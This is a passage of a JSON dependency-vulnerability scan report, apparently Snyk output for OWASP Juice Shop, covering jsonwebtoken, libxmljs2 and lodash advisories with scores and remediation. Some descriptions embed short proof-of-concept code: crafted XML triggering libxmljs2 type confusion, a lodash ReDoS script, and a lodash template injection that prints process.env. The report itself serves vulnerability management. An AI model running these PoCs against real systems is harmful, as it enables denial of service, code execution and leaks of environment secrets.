            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:54.050914Z"
          }
        ],
        "description": "## Overview\n[jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) is a JSON Web Token implementation (symmetric and asymmetric)\n\nAffected versions of this package are vulnerable to Improper Restriction of Security Token Assignment via the `secretOrPublicKey ` argument due to misconfigurations of the key retrieval function `jwt.verify()`. Exploiting this vulnerability might result in incorrect verification of forged tokens when tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm.\r\n\r\n**Note:**\r\nThis vulnerability affects your application if it supports the usage of both symmetric and asymmetric keys in `jwt.verify()` implementation with the same key retrieval function.\n## Remediation\nUpgrade `jsonwebtoken` to version 9.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3)\n- [GitHub Release](https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0)\n",
        "epssDetails": {
          "percentile": "0.14972",
          "probability": "0.00049",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23541"
          ],
          "CWE": [
            "CWE-1259"
          ],
          "GHSA": [
            "GHSA-hjrf-2m68-5959"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2022-12-22T09:14:27.155728Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-12-22T03:33:19Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-12-22T09:16:03.621406Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:54.050914Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "jsonwebtoken@0.4.0"
        ],
        "upgradePath": [
          false,
          "jsonwebtoken@9.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "0.4.0"
      },
      {
        "id": "SNYK-JS-JSONWEBTOKEN-3180026",
        "title": "Use of a Broken or Risky Cryptographic Algorithm",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<9.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "9.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.8,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "cvssV3BaseScore": 8.1,
            "modificationTime": "2024-03-11T09:52:54.264450Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:07:27.935665Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:54.264450Z"
          }
        ],
        "description": "## Overview\n[jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) is a JSON Web Token implementation (symmetric and asymmetric)\n\nAffected versions of this package are vulnerable to Use of a Broken or Risky Cryptographic Algorithm such that the library can be misconfigured to use legacy, insecure key types for signature verification. For example, DSA keys could be used with the RS256 algorithm. \r\n\r\n## Exploitability\r\n\r\nUsers are affected when using an algorithm and a key type _other_ than the combinations mentioned below:\r\n\r\nEC: ES256, ES384, ES512\r\n                  \r\nRSA: RS256, RS384, RS512, PS256, PS384, PS512 \r\n\r\nRSA-PSS: PS256, PS384, PS512                      \r\n\r\nAnd for Elliptic Curve algorithms:\r\n\r\nES256: prime256v1\r\n\r\nES384: secp384r1\r\n\r\nES512:  secp521r1 \r\n\r\n## Workaround \r\n\r\nUsers who are unable to upgrade to the fixed version can use the  `allowInvalidAsymmetricKeyTypes` option  to `true` in the `sign()` and `verify()` functions to continue usage of invalid key type/algorithm combination in 9.0.0 for legacy compatibility.\n## Remediation\nUpgrade `jsonwebtoken` to version 9.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3)\n- [GitHub Release](https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0)\n",
        "epssDetails": {
          "percentile": "0.18569",
          "probability": "0.00058",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23539"
          ],
          "CWE": [
            "CWE-327"
          ],
          "GHSA": [
            "GHSA-8cf7-32gw-wr33"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2022-12-22T09:19:03.430735Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-12-22T03:32:22Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-12-22T10:32:50.173080Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:54.264450Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "jsonwebtoken@0.4.0"
        ],
        "upgradePath": [
          false,
          "jsonwebtoken@9.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "0.4.0"
      },
      {
        "id": "npm:jsonwebtoken:20150331",
        "title": "Authentication Bypass",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P",
        "credit": [
          "Tim McLean"
        ],
        "semver": {
          "vulnerable": [
            "<4.2.2"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.2.2"
        ],
        "patches": [
          {
            "id": "patch:npm:jsonwebtoken:20150331:0",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/jsonwebtoken/20150331/jsonwebtoken_20150331_0_0_1bb584bc382295eeb7ee8c4452a673a77a68b687_snyk.patch"
            ],
            "version": "=4.0.0 || =4.1.0 || =4.2.1",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.753281Z"
          }
        ],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/",
            "title": "Auth0 Blog"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/1bb584bc382295eeb7ee8c4452a673a77a68b687",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/WinDyAlphA/CVE-2015-9235_JWT_key_confusion",
            "title": "PoC"
          },
          {
            "url": "https://www.timmclean.net/2015/02/25/jwt-alg-none.html",
            "title": "Tim McLean Blog"
          },
          {
            "url": "https://github.com/z-bool/Venom-JWT",
            "title": "PoC in GitHub"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-03-11T09:46:39.424974Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 7.3,
            "modificationTime": "2025-04-28T20:49:16.487663Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:19.867949Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.0",
            "modificationTime": "2024-03-11T09:46:39.424974Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 7.3,
            "cvssVersion": "3.0",
            "modificationTime": "2025-04-28T20:49:16.487663Z"
          }
        ],
        "description": "## Overview\r\n[`jsonwebtoken`](https://www.npmjs.com/package/jsonwebtoken) is a JSON Web token implementation for symmetric and asymmetric keys.\r\nAffected versions of this package are vulnerable to an Authentication Bypass attack, due to the \"algorithm\" not being enforced. Attackers are given the opportunity to choose the algorithm sent to the server and generate signatures with arbitrary contents. The server expects an asymmetric key (RSA) but is sent a symmetric key (HMAC-SHA) with RSA's public key, so instead of going through a key validation process, the server will think the public key is actually an HMAC private key.\r\n\r\n## Remediation\r\nUpgrade `jsonwebtoken` to version 4.2.2 or greater.\r\n\r\n## References\r\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/1bb584bc382295eeb7ee8c4452a673a77a68b687)\r\n- [Tim McLean Blog](https://www.timmclean.net/2015/02/25/jwt-alg-none.html)\r\n- [Auth0 Blog](https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/)",
        "epssDetails": {
          "percentile": "0.97300",
          "probability": "0.41149",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2015-9235"
          ],
          "CWE": [
            "CWE-592"
          ],
          "NSP": [
            "17"
          ],
          "GHSA": [
            "GHSA-c7hr-j4mj-j2w6"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-JSONWEBTOKEN-10037",
            "npm:jsonwebtoken:20150331"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2015-03-31T16:00:00Z",
        "functions_new": [],
        "alternativeIds": [
          "SNYK-JS-JSONWEBTOKEN-10037"
        ],
        "disclosureTime": "2015-03-31T16:00:00Z",
        "exploitDetails": {
          "sources": [
            "PoC in GitHub",
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2015-03-31T16:00:00Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-19T12:46:36.363452Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "jsonwebtoken@0.4.0"
        ],
        "upgradePath": [
          false,
          "jsonwebtoken@5.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "0.4.0"
      },
      {
        "id": "SNYK-JS-LIBXMLJS2-6808810",
        "title": "Type Confusion",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "credit": [
          "Uriya Yavnieli"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 8.1,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "libxmljs2",
        "references": [
          {
            "url": "https://github.com/marudor/libxmljs2/issues/204",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-02T08:09:07.427550Z"
          }
        ],
        "description": "## Overview\n[libxmljs2](https://www.npmjs.org/package/libxmljs2) is a libxml bindings for v8 javascript engine\n\nAffected versions of this package are vulnerable to Type Confusion due to the improper handling of a specially crafted XML file. An attacker can cause a denial of service, data leak, infinite loop, or execute arbitrary code by invoking a function on the result of `attrs()` that was called on a parsed node.\n## PoC\n```js\n\nconst libxmljs2 = require('libxmljs2');\n\nvar d = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note\n[\n<!ENTITY writer `\" + 'A'.repeat(0x1234) + `\">\n]>\n<from>&writer;</from>\n`;\n\nt = libxmljs2.parseXml(d, {flags: [libxmljs2.XMLParseFlags.XML_PARSE_HUGE]})\nfrom = t.get('//from')\nc = from.childNodes()[0]\nc2 = c.childNodes()[0]\nc2_attrs = c2.attrs()\n```\n## Remediation\nThere is no fixed version for `libxmljs2`.\n\n## References\n- [GitHub Issue](https://github.com/marudor/libxmljs2/issues/204)\n",
        "epssDetails": {
          "percentile": "0.86712",
          "probability": "0.03260",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-34393"
          ],
          "CWE": [
            "CWE-843"
          ],
          "GHSA": [
            "GHSA-mjr4-7xg5-pfvh"
          ]
        },
        "packageName": "libxmljs2",
        "proprietary": false,
        "creationTime": "2024-05-05T10:25:25.434709Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-05-02T21:30:29Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-05-05T10:25:25.625355Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-02T08:09:07.427550Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "libxmljs2@0.37.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "libxmljs2",
        "version": "0.37.0"
      },
      {
        "id": "SNYK-JS-LIBXMLJS2-6808816",
        "title": "Type Confusion",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 8.1,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "libxmljs2",
        "references": [
          {
            "url": "https://github.com/marudor/libxmljs2/issues/205",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-02T08:10:05.171208Z"
          }
        ],
        "description": "## Overview\n[libxmljs2](https://www.npmjs.org/package/libxmljs2) is a libxml bindings for v8 javascript engine\n\nAffected versions of this package are vulnerable to Type Confusion when parsing a specially crafted XML while invoking the namespaces() function (which invokes `XmlNode::get_local_namespaces()`) on a grand-child of a node that refers to an entity. \r\n\r\nExploiting this vulnerability leads to an RCE, data leak DoS on 64-bit and 32-bit systems.\n## PoC\n```js\r\n\r\nconst libxmljs2 = require('libxmljs2');\r\n\r\nvar d = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE note\r\n[\r\n<!ENTITY writer PUBLIC \"` + \"A\".repeat(8) + \"B\".repeat(8) + \"C\".repeat(8) + \"D\".repeat(8) + \"P\".repeat(8) + `\" \"JFrog Security\">\r\n]>\r\n<from>&writer;</from>\r\n`;\r\n\r\nt = libxmljs2.parseXml(d)\r\nfrom = t.get('//from')\r\nc = from.childNodes()[0]\r\nc2 = c.childNodes()[0] //entity_decl\r\nn = c2.namespaces(true) //onlyLocal = true\r\n\r\n```\n## Remediation\nThere is no fixed version for `libxmljs2`.\n\n## References\n- [GitHub Issue](https://github.com/marudor/libxmljs2/issues/205)\n",
        "epssDetails": {
          "percentile": "0.86712",
          "probability": "0.03260",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-34394"
          ],
          "CWE": [
            "CWE-843"
          ],
          "GHSA": [
            "GHSA-78h3-pg4x-j8cv"
          ]
        },
        "packageName": "libxmljs2",
        "proprietary": false,
        "creationTime": "2024-05-05T10:34:09.176601Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-05-02T21:30:29Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-05-05T10:34:09.367934Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-02T08:10:05.171208Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "libxmljs2@0.37.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "libxmljs2",
        "version": "0.37.0"
      },
      {
        "id": "SNYK-JS-LODASH-1018905",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
        "credit": [
          "Liyuan Chen"
        ],
        "semver": {
          "vulnerable": [
            "<4.17.21"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.17.21"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "lodash",
        "references": [
          {
            "url": "https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/lodash/lodash/pull/5065",
            "title": "GitHub Fix PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:51:35.916317Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:53:48.045177Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-06-13T13:26:35.874158Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:51:35.916317Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:48.045177Z"
          }
        ],
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions.\r\n\r\n### POC\r\n```\r\nvar lo = require('lodash');\r\n\r\nfunction build_blank (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\n\r\nvar s = build_blank(50000)\r\nvar time0 = Date.now();\r\nlo.trim(s)\r\nvar time_cost0 = Date.now() - time0;\r\nconsole.log(\"time_cost0: \" + time_cost0)\r\n\r\nvar time1 = Date.now();\r\nlo.toNumber(s)\r\nvar time_cost1 = Date.now() - time1;\r\nconsole.log(\"time_cost1: \" + time_cost1)\r\n\r\nvar time2 = Date.now();\r\nlo.trimEnd(s)\r\nvar time_cost2 = Date.now() - time2;\r\nconsole.log(\"time_cost2: \" + time_cost2)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `lodash` to version 4.17.21 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a)\n- [GitHub Fix PR](https://github.com/lodash/lodash/pull/5065)\n",
        "epssDetails": {
          "percentile": "0.21950",
          "probability": "0.00069",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2020-28500"
          ],
          "CWE": [
            "CWE-400"
          ]
        },
        "packageName": "lodash",
        "proprietary": true,
        "creationTime": "2020-10-16T16:48:40.985673Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2020-10-16T16:47:34Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2021-02-15T11:50:49Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-06-13T13:26:35.874158Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2",
          "lodash@2.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.7.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "lodash",
        "version": "2.4.2"
      },
      {
        "id": "SNYK-JS-LODASH-1040724",
        "title": "Code Injection",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
        "credit": [
          "Marc Hassan"
        ],
        "semver": {
          "vulnerable": [
            "<4.17.21"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.17.21"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.2,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "lodash",
        "references": [
          {
            "url": "https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js%23L14851",
            "title": "Vulnerable Code"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 7.2,
            "modificationTime": "2024-03-11T09:51:35.923412Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 7.2,
            "modificationTime": "2024-03-11T09:53:48.047427Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-05-30T09:23:01.108804Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:51:35.923412Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 7.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:48.047427Z"
          }
        ],
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Code Injection via `template`.\r\n\r\n### PoC\r\n```js\r\nvar _ = require('lodash');\r\n\r\n_.template('', { variable: '){console.log(process.env)}; with(obj' })()\r\n```\n## Remediation\nUpgrade `lodash` to version 4.17.21 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c)\n- [Vulnerable Code](https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js#L14851)\n",
        "epssDetails": {
          "percentile": "0.54851",
          "probability": "0.00322",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2021-23337"
          ],
          "CWE": [
            "CWE-94"
          ],
          "GHSA": [
            "GHSA-35jh-r3h4-6jhm"
          ]
        },
        "packageName": "lodash",
        "proprietary": true,
        "creationTime": "2020-11-17T14:07:17.048472Z",
        "functions_new": [],
